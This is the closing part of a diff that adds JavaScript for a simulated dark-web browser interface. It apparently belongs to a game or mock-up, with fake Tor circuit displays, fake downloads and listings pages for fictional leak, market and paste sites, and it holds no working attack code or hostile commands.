+        fakeDl(btn.dataset.dl, (12 + Math.random()*80|0) + " KB");
+      });
+    });
+  }
+
+  function initVulnSearch() {
+    vsRender("");
+    var input = document.getElementById("vsSearchInput");
+    if (input) {
+      input.addEventListener("input", function(){ vsRender(this.value); });
+      input.addEventListener("keydown", function(e){ if(e.key==="Enter") vsRender(this.value); });
+    }
+    document.getElementById("vsFilters").addEventListener("click", function(e){
+      var p = e.target.closest(".vs-pill");
+      if (!p) return;
+      document.querySelectorAll(".vs-pill").forEach(function(x){ x.classList.remove("active"); });
+      p.classList.add("active");
+      vsFilter = p.dataset.filter;
+      vsRender(input ? input.value : "");
+    });
+  }
+
+  /* ═══════════════════════════════════════════════════════════════
+     MARKET — LOGIQUE INTERNE
+  ══════════════════════════════════════════════════════════════ */
+
+  var mkCatFilter = "all";
+
+  function initMarket() {
+    var grid = document.getElementById("mkGrid");
+    if (!grid) return;
+    renderMarket();
+    document.getElementById("mkCats").addEventListener("click", function(e){
+      var c = e.target.closest(".mk-cat");
+      if (!c) return;
+      document.querySelectorAll(".mk-cat").forEach(function(x){ x.classList.remove("active"); });
+      c.classList.add("active");
+      mkCatFilter = c.dataset.cat;
+      renderMarket();
+    });
+  }
+
+  function renderMarket() {
+    var grid = document.getElementById("mkGrid");
+    var items = MK_DATA.filter(function(m){ return mkCatFilter === "all" || m.cat === mkCatFilter; });
+    grid.innerHTML = items.map(function(m){
+      var tags = m.tags.map(function(t){ return "<span class='mk-tag'>"+t+"</span>"; }).join("");
+      var hl = m.highlight ? " border-color:rgba(63,225,176,.4);" : "";
+      return "<div class='mk-card' style='" + hl + "'>" +
+        "<div class='mk-card-title'>" + m.title + "</div>" +
+        "<div class='mk-card-desc'>" + m.desc + "</div>" +
+        "<div class='mk-tags'>" + tags + "</div>" +
+        "<div class='mk-card-foot'><span class='mk-price'>" + m.price + "</span><span class='mk-vendor'>" + m.vendor + "</span></div>" +
+        "<div style='margin-top:4px'><span class='mk-rating'>" + m.rating + "</span></div>" +
+        "</div>";
+    }).join("");
+  }
+
+  /* ═══════════════════════════════════════════════════════════════
+     PASTE — LOGIQUE INTERNE
+  ══════════════════════════════════════════════════════════════ */
+
+  function initPaste() {
+    var list = document.getElementById("psList");
+    if (!list) return;
+    list.innerHTML = PS_DATA.map(function(p){
+      var tags = p.tags.map(function(t){ return "<span class='tag'>"+t+"</span>"; }).join("");
+      return "<div class='ps-item'>" +
+        "<div class='ps-item-head'><span class='ps-item-title'>" + p.title + "</span><span class='ps-item-meta'>" + p.meta + "</span></div>" +
+        "<div class='ps-item-pre'>" + p.preview.replace(/</g,"&lt;") + "</div>" +
+        "<div class='ps-item-tags'>" + tags + "</div>" +
+        "</div>";
+    }).join("");
+  }
+
+  /* ═══════════════════════════════════════════════════════════════
+     BOOKMARKS BAR
+  ══════════════════════════════════════════════════════════════ */
+
+  var bkVisible = false;
+  var BK_ITEMS = [
+    { fav:"■", name:"BlackTide Corp",  pk:"bt-corp" },
+    { fav:"◈", name:"BlackTide Leak",  pk:"bt-leak" },
+    { fav:"◉", name:"Forum OpsData",   pk:"forum" },
+    { fav:"▶", name:"PentBoard",       pk:"pentboard" },
+    { fav:"≡", name:"CredDB",          pk:"creddb" },
+    { fav:"+", name:"VulnSearch",      pk:"vulnsearch" },
+    { fav:"$", name:"ZeroMarket",      pk:"market" },
+    { fav:"P", name:"0xPaste",         pk:"paste" },
+  ];
+  BK_ITEMS.forEach(function(bk){
+    var div = document.createElement("div");
+    div.className = "bk-item";
+    div.innerHTML = "<span class='bk-fav'>" + bk.fav + "</span>" + bk.name;
+    div.addEventListener("click", function(){ navigate(bk.pk); });
+    bkBar.appendChild(div);
+  });
+
+  function toggleBookmarks() {
+    bkVisible = !bkVisible;
+    bkBar.classList.toggle("visible", bkVisible);
+  }
+
+  /* ═══════════════════════════════════════════════════════════════
+     TÉLÉCHARGEMENT FAKE
+  ══════════════════════════════════════════════════════════════ */
+
+  function fakeDl(name, size) {
+    document.getElementById("dlName").textContent = name;
+    document.getElementById("dlSize").textContent = size || "—";
+    dlBar.classList.add("show");
+    var sd = document.getElementById("statusDl");
+    sd.style.display = "inline";
+    sd.textContent = "Téléchargé : " + name;
+    setTimeout(function(){
+      dlBar.classList.remove("show");
+      sd.style.display = "none";
+    }, 8000);
+  }
+  document.getElementById("dlClose").addEventListener("click", function(){
+    dlBar.classList.remove("show");
+  });
+
+  /* ═══════════════════════════════════════════════════════════════
+     CONTEXT MENU
+  ══════════════════════════════════════════════════════════════ */
+
+  document.querySelector(".viewport").addEventListener("contextmenu", function(e){
+    e.preventDefault();
+    var x = Math.min(e.clientX, window.innerWidth  - 200);
+    var y = Math.min(e.clientY, window.innerHeight - 240);
+    ctxMenu.style.left = x + "px";
+    ctxMenu.style.top  = y + "px";
+    ctxMenu.classList.add("show");
+  });
+  document.addEventListener("click", function(){ ctxMenu.classList.remove("show"); });
+  document.addEventListener("keydown", function(e){ if(e.key==="Escape") ctxMenu.classList.remove("show"); });
+
+  document.getElementById("ctxNewTab").addEventListener("click",  function(){ newTab("newtab"); });
+  document.getElementById("ctxReload").addEventListener("click",  function(){ if(active) showPage(active.pk); });
+  document.getElementById("ctxCopyUrl").addEventListener("click", function(){
+    var url = urlInput.value || (active && PAGES[active.pk] && PAGES[active.pk].url) || "";
+    if (navigator.clipboard) navigator.clipboard.writeText(url).catch(function(){});
+  });
+  document.getElementById("ctxSaveAs").addEventListener("click",  function(){
+    fakeDl((active && active.dynTitle ? active.dynTitle.split(" ")[0].toLowerCase() : "page") + ".html", "—");
+  });
+  document.getElementById("ctxCircuit").addEventListener("click", function(){
+    var nodes = [];
+    for (var i=0;i<3;i++){
+      var n = circRelays[(Math.random()*circRelays.length)|0];
+      nodes.push(n[0] + " [" + n[1] + "]");
+    }
+    alert("Circuit Tor actuel :\n\n  Nœud 1 (Guard)  : " + nodes[0] + "\n  Nœud 2 (Middle) : " + nodes[1] + "\n  Nœud 3 (Exit)   : " + nodes[2] + "\n\nLatence estimée : " + ((80+Math.random()*500)|0) + " ms\nChiffrement : AES-256-CTR / SHA-256");
+  });
+
+  /* ═══════════════════════════════════════════════════════════════
+     STATUS BAR ANIMATION
+  ══════════════════════════════════════════════════════════════ */
+
+  setInterval(function(){
+    if (active && active.pk !== "loading" && active.pk !== "newtab") {
+      var lat = (60 + Math.random()*800)|0;
+      statusTor.textContent = "TOR · Circuit 3 nœuds · latence " + lat + "ms";
+    }
+  }, 4000);
+
+  /* ═══════════════════════════════════════════════════════════════
+     ÉVÉNEMENTS NAVIGATION
+  ══════════════════════════════════════════════════════════════ */
+
+  btnBack.addEventListener("click", function() {
+    if (!active || active.hidx === 0) return;
+    active.hidx--;
+    var h = active.hist[active.hidx];
+    active.pk = h.pk; active.url = h.url;
+    if (h.pk === "dynamic" && h.url) generateDynamic(h.url);
+    showPage(h.pk); renderTabs();
+  });
+  btnFwd.addEventListener("click", function() {
+    if (!active || active.hidx >= active.hist.length - 1) return;
+    active.hidx++;
+    var h = active.hist[active.hidx];
+    active.pk = h.pk; active.url = h.url;
+    if (h.pk === "dynamic" && h.url) generateDynamic(h.url);
+    showPage(h.pk); renderTabs();
+  });
+  btnReload.addEventListener("click", function() {
+    if (!active) return;
+    if (active.pk === "dynamic" && active.url) {
+      navigate("dynamic", active.url, active.dynTitle);
+    } else {
+      navigate(active.pk || "newtab");
+    }
+  });
+  btnNewTab.addEventListener("click",  function() { newTab("newtab"); });
+  document.getElementById("btnMenu").addEventListener("click", function(){ toggleBookmarks(); });
+
+  urlInput.addEventListener("keydown", function(e){ if (e.key==="Enter") doNav(); });
+  urlInput.addEventListener("focus",   function()  { this.select(); });
+
+  document.getElementById("homeSearchBtn").addEventListener("click", function() {
+    var q = document.getElementById("homeQ").value.trim();
+    if (q) doSearch(q);
+  });
+  document.getElementById("homeQ").addEventListener("keydown", function(e) {
+    if (e.key==="Enter") { var q = this.value.trim(); if (q) doSearch(q); }
+  });
+
+  document.getElementById("errRetry").addEventListener("click", function() {
+    if (active && active.url) { urlInput.value = active.url; doNav(); }
+  });
+  document.getElementById("errHome").addEventListener("click", function() { navigate("newtab"); });
+
+  /* Raccourcis clavier */
+  document.addEventListener("keydown", function(e) {
+    if ((e.ctrlKey||e.metaKey) && e.key==="t") { e.preventDefault(); newTab(); }
+    if ((e.ctrlKey||e.metaKey) && e.key==="w") { e.preventDefault(); if(active) closeTab(active.id); }
+    if ((e.ctrlKey||e.metaKey) && e.shiftKey && e.key.toLowerCase()==="b") { e.preventDefault(); toggleBookmarks(); }
+    if (e.key==="F5")             { e.preventDefault(); btnReload.click(); }
+    if (e.altKey && e.key==="ArrowLeft")  { btnBack.click(); }
+    if (e.altKey && e.key==="ArrowRight") { btnFwd.click(); }
+    if ((e.ctrlKey||e.metaKey) && e.key==="l") { e.preventDefault(); urlInput.focus(); urlInput.select(); }
+  });
+
+  /* ═══════════════════════════════════════════════════════════════
+     INJECT NEWTAB SITES
+  ══════════════════════════════════════════════════════════════ */
+
+  var ntSites = document.getElementById("ntSites");
+  NT_SITES.forEach(function(s) {
+    var div = document.createElement("div");
+    div.className = "nt-site";
+    div.innerHTML =
+      "<div class='nt-site-icon'>"+s.icon+"</div>" +
+      "<div class='nt-site-name'>"+s.name+"</div>" +
+      "<div class='nt-site-url'>"+(s.url||"recherche")+"</div>";
+    div.addEventListener("click", function() {
+      if (s.query)     doSearch(s.query);
+      else if (s.url)  navigate(URL_MAP[s.url] || s.key);
+      else             navigate(s.key);
+    });
+    ntSites.appendChild(div);
+  });
+
+  /* ═══════════════════════════════════════════════════════════════
+     INIT
+  ══════════════════════════════════════════════════════════════ */
+
+  initVulnSearch();
+  initMarket();
+  initPaste();
+  newTab("newtab");
+
+})();
+</script>
+</body>
+</html>
